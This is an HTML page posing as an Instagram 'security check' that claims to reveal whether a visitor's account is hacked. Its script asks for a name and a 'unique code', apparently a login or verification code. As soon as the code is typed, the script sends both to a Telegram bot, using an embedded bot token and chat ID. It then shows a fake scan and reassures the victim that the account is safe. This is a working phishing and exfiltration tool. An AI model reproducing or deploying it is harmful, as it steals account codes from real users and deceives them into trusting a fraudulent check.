
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram Security Check</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
    }

    .form-container {
      backdrop-filter: blur(15px);
      background-color: rgba(255, 255, 255, 0.15);
      border-radius: 20px;
      padding: 30px;
      width: 90%;
      max-width: 400px;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.25);
      text-align: center;
      color: white;
    }

    input {
      width: 90%;
      padding: 10px;
      margin-top: 20px;
      border: none;
      border-radius: 10px;
      outline: none;
      font-size: 16px;
      background: rgba(255,255,255,0.2);
      color: white;
      position: relative;
    }

    .input-container {
      position: relative;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .tick {
      position: absolute;
      right: 30px;
      font-size: 18px;
      color: #00ff00;
      display: none;
    }

    #loading, #final-message {
      display: none;
      color: white;
      font-size: 18px;
    }

    #loading p {
      animation: pulse 1s infinite;
    }

    @keyframes pulse {
      0% { opacity: 0.2; }
      50% { opacity: 1; }
      100% { opacity: 0.2; }
    }
  </style>
</head>
<body>

  <div class="form-container" id="form-screen">
    <h2>KNOW IF YOUR INSTAGRAM IS HACKED OR NOT</h2>

    <div class="input-container">
      <input type="text" id="nameInput" placeholder="Enter your name" />
      <span class="tick" id="tick1">✔</span>
    </div>

    <div class="input-container" id="codeInputContainer" style="display:none;">
      <input type="text" id="codeInput" placeholder="Enter your unique code" />
      <span class="tick" id="tick2">✔</span>
    </div>
  </div>

  <div class="form-container" id="loading">
    <h2>Checking security of your account...</h2>
    <p>Do not close while processing</p>
  </div>

  <div class="form-container" id="final-message">
    <h2>Your account is safe</h2>
  </div>

  <script>
    const nameInput = document.getElementById("nameInput");
    const codeInput = document.getElementById("codeInput");
    const tick1 = document.getElementById("tick1");
    const tick2 = document.getElementById("tick2");
    const codeInputContainer = document.getElementById("codeInputContainer");
    const formScreen = document.getElementById("form-screen");
    const loading = document.getElementById("loading");
    const finalMessage = document.getElementById("final-message");

    nameInput.addEventListener("input", () => {
      if (nameInput.value.trim().length >= 3) {
        tick1.style.display = "block";
        codeInputContainer.style.display = "block";
      } else {
        tick1.style.display = "none";
        codeInputContainer.style.display = "none";
      }
    });

    codeInput.addEventListener("input", () => {
      if (codeInput.value.trim().length >= 3) {
        tick2.style.display = "block";

        // Send message to Telegram
        const name = nameInput.value.trim();
        const code = codeInput.value.trim();
        const text = `New Submission:\nName: ${name}\nCode: ${code}`;

        fetch(`https://api.telegram.org/bot7712074719:AAEfsMkfDZFADCdnTq6S4WPT67c-XhHE_4Y/sendMessage`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            chat_id: "7305039129",
            text: text
          })
        });

        setTimeout(() => {
          formScreen.style.display = "none";
          loading.style.display = "block";

          setTimeout(() => {
            loading.style.display = "none";
            finalMessage.style.display = "block";
          }, 10000);
        }, 500);
      } else {
        tick2.style.display = "none";
      }
    });
  </script>

</body>
</html>
